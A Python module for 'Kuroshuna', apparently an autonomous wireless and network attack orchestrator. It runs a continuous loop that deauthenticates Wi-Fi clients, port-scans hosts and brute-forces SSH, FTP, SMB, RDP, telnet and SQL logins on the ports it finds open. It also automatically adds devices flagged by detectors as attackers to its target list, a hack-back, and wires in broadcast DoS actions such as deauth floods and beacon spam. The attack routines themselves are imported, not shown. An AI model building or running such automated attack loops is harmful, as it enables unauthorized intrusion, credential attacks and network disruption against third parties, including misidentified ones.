"""Kuroshuna autonomous orchestrator: the scoped 'runs automatically like
pwnagotchi/Bjorn' loop. Each tick() enumerates ONLY the authorized target set
(approved_targets + confirmed auto-hostiles), skips those in cooldown, and
chains recon->attack per target. Every offense call still passes through the
gate. Tier B broadcast is NEVER auto-fired here -- indiscriminate DoS stays an
explicit, deliberate call. on_event() promotes detector-confirmed attackers into
the gate's session auto-hostile set.
"""
from __future__ import annotations

import logging
import time

from kuma_core import kuroshuna_stats

_log = logging.getLogger(__name__)

from kuma_core.authz import _is_mac

PORT_PROTO = {22: "ssh", 21: "ftp", 445: "smb", 3389: "rdp",
              23: "telnet", 3306: "sql"}


class KuroshunaOrchestrator:
    # detector event_types that confirm an active attacker worth counter-targeting
    HOSTILE_EVENTS = {
        "deauth_burst", "disassoc_burst", "pwnagotchi_detected",
        "ssh_bruteforce", "evil_twin", "rogue_ap", "karma_probe",
    }

    # explicit Tier B passthrough -- NEVER called from tick(); broadcast DoS is
    # always a deliberate operator action. The BroadcastRF method itself enforces
    # broadcast_allowed() + time-box + footprint limits.
    _SIM = {"deauth_flood", "beacon_spam", "assoc_flood", "ble_spam"}

    def __init__(self, gate, *, rf=None, net=None, bcast=None, cooldown=None,
                 clock=None, sleep=None) -> None:
        self.gate = gate
        self.rf = rf
        self.net = net
        self.bcast = bcast
        self.cooldown = (cooldown if cooldown is not None
                         else gate.cfg.get("response_cooldown", 30))
        self._clock = clock or time.monotonic
        self._sleep = sleep or time.sleep
        self._last: dict[str, float] = {}

    def _authorized_targets(self) -> list:
        approved = list(self.gate.cfg.get("approved_targets", []))
        hostiles = sorted(self.gate._auto_hostile)   # session-scoped set
        seen, out = set(), []
        for t in approved + hostiles:
            key = (t or "").strip().upper()
            if key and key not in seen:
                seen.add(key)
                out.append(t)
        return out

    def _cooldown_ok(self, target: str) -> bool:
        last = self._last.get(target.upper())
        return last is None or (self._clock() - last) >= self.cooldown

    def _mark(self, target: str) -> None:
        self._last[target.upper()] = self._clock()

    def engage(self, target: str, *, channel: int = 6) -> list:
        actions = []
        if _is_mac(target):
            if self.rf is not None:
                result = self.rf.deauth(target)
                actions.append(("deauth", result))
                if getattr(result, "ok", False):
                    try:
                        kuroshuna_stats.record_pwn(target)
                    except Exception:
                        pass
        else:
            if self.net is not None:
                scan = self.net.scan(target)
                actions.append(("scan", scan))
                if getattr(scan, "ok", False) and getattr(scan, "open_ports", None):
                    for port in scan.open_ports:
                        proto = PORT_PROTO.get(port)
                        if proto:
                            actions.append(
                                (f"brute_{proto}", self.net.bruteforce(target, proto)))
        return actions

    def tick(self, *, channel: int = 6) -> dict:
        if not self.gate.armed():
            return {"armed": False, "actions": []}
        actions = []
        for t in self._authorized_targets():
            if not self._cooldown_ok(t):
                continue
            try:
                actions.extend(self.engage(t, channel=channel))
                self._mark(t)
            except Exception as exc:  # noqa: BLE001 - one bad target must not kill the pass
                _log.warning("engage(%s) raised: %s - skipping", t, exc)
        return {"armed": True, "actions": actions}

    def on_event(self, event: dict) -> bool:
        """Promote a detector-confirmed attacker into the gate's auto-hostile set.
        Returns True if a new hostile was armed. The gate still refuses protected/
        own gear, so this can never auto-target our own equipment."""
        if event.get("severity") not in ("high", "critical"):
            return False
        if event.get("event_type") not in self.HOSTILE_EVENTS:
            return False
        ident = (event.get("bssid") or event.get("source") or "").strip()
        if not ident:
            return False
        return self.gate.auto_hostile_add(ident, evidence=event.get("event_type", ""))

    def simulate(self, action: str, **kwargs):
        if action not in self._SIM:
            raise ValueError(f"unknown broadcast action: {action}")
        if self.bcast is None:
            raise RuntimeError("no BroadcastRF engine wired")
        return getattr(self.bcast, action)(**kwargs)

    def run(self, *, interval: float = 10.0, channel: int = 6) -> None:  # pragma: no cover
        """Thin continuous loop over tick(); for on-device autonomous operation."""
        while True:
            self.tick(channel=channel)
            self._sleep(interval)


def build_args(argv):
    import argparse
    p = argparse.ArgumentParser(
        prog="detectors.kuroshuna",
        description="Kuroshuna orchestrator: scoped autonomous Tier A loop.")
    p.add_argument("--tick", action="store_true", help="run one scoped pass and exit")
    p.add_argument("--run", action="store_true", help="continuous loop (Ctrl-C to stop)")
    p.add_argument("--interval", type=float, default=10.0)
    p.add_argument("--channel", type=int, default=6)
    return p.parse_args(argv)


def run_cli(args, orch=None) -> int:
    if not (args.tick or args.run):
        print("error: specify --tick or --run", flush=True)
        return 2
    if orch is None:
        from kuma_core.authz import Gate
        from offense.net_offense import NetworkOffense
        from offense.rf_broadcast import BroadcastRF
        from offense.rf_targeted import TargetedRF
        gate = Gate()
        orch = KuroshunaOrchestrator(
            gate=gate, rf=TargetedRF(gate=gate), net=NetworkOffense(gate=gate),
            bcast=BroadcastRF(gate=gate))
    if args.run:  # pragma: no cover
        orch.run(interval=args.interval, channel=args.channel)
        return 0
    out = orch.tick(channel=args.channel)
    print(f"[kuroshuna] armed={out['armed']} actions={len(out['actions'])}", flush=True)
    for name, res in out["actions"]:
        print(f"  - {name}: {res}", flush=True)
    return 0


if __name__ == "__main__":  # pragma: no cover
    import sys
    sys.exit(run_cli(build_args(sys.argv[1:])))
